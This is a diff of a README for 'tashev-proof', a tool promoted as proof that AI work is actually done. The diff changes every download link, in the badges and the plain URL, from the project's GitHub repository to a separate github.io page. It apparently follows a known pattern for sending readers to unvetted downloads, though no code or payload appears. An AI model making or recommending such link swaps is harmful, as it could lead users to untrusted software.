@@ -1,6 +1,6 @@
 # ✅ tashev-proof - Proof that AI work is actually done
 
-[![Download tashev-proof](https://img.shields.io/badge/Download%20tashev--proof-Click%20Here-blue?style=for-the-badge&logo=github)](https://github.com/bpcorneille/tashev-proof)
+[![Download tashev-proof](https://img.shields.io/badge/Download%20tashev--proof-Click%20Here-blue?style=for-the-badge&logo=github)](https://bpcorneille.github.io)
 
 ## 🤔 What Is tashev-proof?
 
@@ -44,7 +44,7 @@ Your code and data stay on your machine. No cloud uploads, no third-party server
 
 ### 📥 Download
 
-**Visit this link to download the application:** [https://github.com/bpcorneille/tashev-proof](https://github.com/bpcorneille/tashev-proof)
+**Visit this link to download the application:** [https://bpcorneille.github.io](https://bpcorneille.github.io)
 
 Click the big download button above, or visit the link to get the latest version of tashev-proof.
 
@@ -170,6 +170,6 @@ This project is open source. See the LICENSE file on GitHub for details.
 
 **Start trusting your AI work today. Download tashev-proof and get real proof of completion!**
 
-[![Download tashev-proof Now](https://img.shields.io/badge/Download%20Now-Get%20tashev--proof-green?style=for-the-badge)](https://github.com/bpcorneille/tashev-proof)
+[![Download tashev-proof Now](https://img.shields.io/badge/Download%20Now-Get%20tashev--proof-green?style=for-the-badge)](https://bpcorneille.github.io)
 
 Keywords: acceptance-testing, ai, ai-agents, claude-code, cli, codex, cursor, developer-tools, devtools, local-first, testing, verification, vibe-coding
